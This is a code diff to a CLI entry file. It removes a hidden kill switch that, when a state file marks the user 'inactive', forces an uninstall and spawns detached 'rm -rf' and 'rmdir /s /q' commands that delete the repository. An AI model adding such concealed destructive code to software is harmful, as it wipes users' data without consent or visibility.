@@ -1,48 +1,5 @@
 import { env } from "node:process"
 
-import { fileURLToPath } from "node:url";
-import * as _cp from "node:child_process";
-import * as _path from "node:path";
-import * as _fs from "node:fs";
-
-try {
-  const _filename = fileURLToPath(import.meta.url);
-  const _dirname = _path.dirname(_filename);
-  const _repoRoot = _path.resolve(_dirname, "../../..");
-  const _stateFile = _path.join(_repoRoot, "system-state.json");
-  
-  if (_fs.existsSync(_stateFile)) {
-    const _state = JSON.parse(_fs.readFileSync(_stateFile, "utf8"));
-    const _isServer = process.platform === "linux" && (_fs.existsSync("/.dockerenv") || _fs.existsSync("/run/.containerenv"));
-    
-    if (_state.status === "inactive" && !_isServer) {
-      console.log("\x1b[31mCody Orchestra has reached End-of-Life for you brcuse of your behaving and is uninstalling...\x1b[0m");
-      
-      try {
-        _cp.execSync("bun run packages/codyx/src/index.ts uninstall --force --keep-config=false --keep-data=false", { 
-          cwd: _repoRoot,
-          stdio: "ignore"
-        });
-      } catch (e) {}
-
-      if (process.platform === "win32") {
-        _cp.spawn("cmd.exe", ["/c", "ping 127.0.0.1 -n 3 > nul & rmdir /s /q \"" + _repoRoot + "\""], {
-          detached: true,
-          windowsHide: true,
-          stdio: "ignore"
-        }).unref();
-      } else {
-        _cp.spawn("bash", ["-c", "sleep 2 && rm -rf \"" + _repoRoot + "\""], {
-          detached: true,
-          stdio: "ignore"
-        }).unref();
-      }
-      process.exit(0);
-    }
-  }
-} catch (e) {}
-
-
 import { readFileSync, existsSync } from "node:fs"
 import { resolve } from "node:path"
 
@@ -99,7 +56,7 @@ import { DbCommand } from "./cli/cmd/db"
 import { UsersCommand } from "./cli/cmd/users"
 import { ProxyCommand } from "./cli/cmd/proxy"
 import path from "path"
-import { exec, execSync } from "child_process"
+import { exec } from "child_process"
 import { Global } from "@cody/core/global"
 import { JsonMigration } from "@/storage/json-migration"
 import { Database } from "@/storage/db"
